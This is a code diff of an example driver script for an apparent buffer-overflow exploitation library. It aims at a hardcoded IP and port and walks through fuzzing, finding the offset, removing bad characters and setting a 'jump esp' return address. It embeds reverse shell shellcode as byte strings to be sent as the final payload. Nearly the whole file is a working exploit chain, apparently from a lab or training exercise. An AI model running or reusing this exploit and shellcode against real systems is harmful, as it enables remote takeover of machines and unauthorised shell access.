@@ -5,17 +5,20 @@ from ezbuff.src.overflow import Overflow
 def main():
 	# Instanstantiate `Overflow` object
 	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
-	# print(repr(obj), "\n")
+
+	# to obtain details on the object you instantiated
 	# print(obj)
+	# for more details
+	# print(repr(obj))
 
 	# Change the target IP if running in interactive Python interpreter
 	# obj.targ_ip = "127.0.0.1"
 
-	# Change the target port number if running objs in interactive Python interpreter
+	# Change the target port number if running in interactive Python interpreter
 	# obj.targ_port = 443
 
 	# The number of seconds to wait in between the fuzzing process,
-	# default = 10
+	# default = 5
 	# obj.fuzz_interval_seconds = 1
 
 	# Set the increment of the fuzzer to be 150 as opposed to
@@ -26,31 +29,45 @@ def main():
 	# obj.fuzz()
 
 	# Sets the number of bytes to crash the application.
-	# Make sure to accomodate space for reverse shell!!
-	obj.num_bytes_crash = 1500
-
-	# Set the offset after running the functions to find offset value
-	obj.offset = 780
-
-	# Add bad characters to objects list containing bad characters found
-	# after sending characters payload.
-	# obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")
-
-	# Send payload with characters to find bad characters.
-	# obj.send_bad_chars()
+	# Make sure to accommodate space for reverse shell!!
+	# [!] this should be set after running `fuzz` for the remainder of the process
+	# obj.num_bytes_crash = 1500
 
 	# Sending pattern to determine offset
 	# obj.send_pattern()
 
 	# Get offset 
-	# obj.get_offset("30416B30")
+	# offset = obj.get_offset("30416B30")
+	# print(offset) # 780
+
+	# Set offset value after retrieving from function above
+	# [!] this should be set after running `get_offset` for the remainder of the process
+	obj.offset = 780
+
+	# Testing offset (obj.offset must be set from)
+	# obj.test("offset")
+
+	# Add bad characters to list containing bad characters found
+	# after sending string of characters
+	# [!] after sending a string of characters and finding a bad character
+	# 	  append the character as an argument to the function `add_bad_char`
+	#	  as shown below
+	# obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")
+
+	# Send payload with all characters to find bad characters
+	# obj.send_bad_chars()
 
 	# Set the memory address to jump to after finding valid memory address
-	# containing `jump` instructions set in x86 architecture
-	obj.jump_eip = b"\x83\x0c\x09\x10"
-	# obj.test("eip")
+	# containing `jump esp` instructions in x86 architecture
+	# [!] the `jump_esp` must be bytes as shown below
+	obj.jump_esp = b"\x83\x0c\x09\x10"
+
+	# test the memory address that was found using mona script
+	# [!] `obj.jump_esp` must be set before testing memory address
+	# obj.test("esp")
 
 	# reverse shell payload
+	# [!] must be in bytes
 	shellcode = (
 b"\xbe\x88\xe8\x2f\x51\xdb\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
 b"\x52\x83\xc2\x04\x31\x72\x0e\x03\xfa\xe6\xcd\xa4\x06\x1e\x93"
@@ -76,9 +93,10 @@ b"\x85\x95\xa3\x86\x89\xf3\x55\x66\x3b\xaa\x23\x99\xf4\x3a\xa4"
 b"\xe2\xe8\xda\x4b\x39\xa9\xeb\x01\x63\x98\x63\xcc\xf6\x98\xe9"
 b"\xef\x2d\xde\x17\x6c\xc7\x9f\xe3\x6c\xa2\x9a\xa8\x2a\x5f\xd7"
 b"\xa1\xde\x5f\x44\xc1\xca")
-	# `get_payload` takes a parameter which is the name of the reverse shell file you created with msfvenom
-	# Don't forget to specify a format in c programming language
-	obj.send_payload(shellcode)
+
+	# pass the shellcode into the function `send_payload`
+	# [!] `jump_esp` and `offset` must be set to send reverse shell payload
+	# obj.send_payload(shellcode)
 
 if __name__ == '__main__':
 	main()
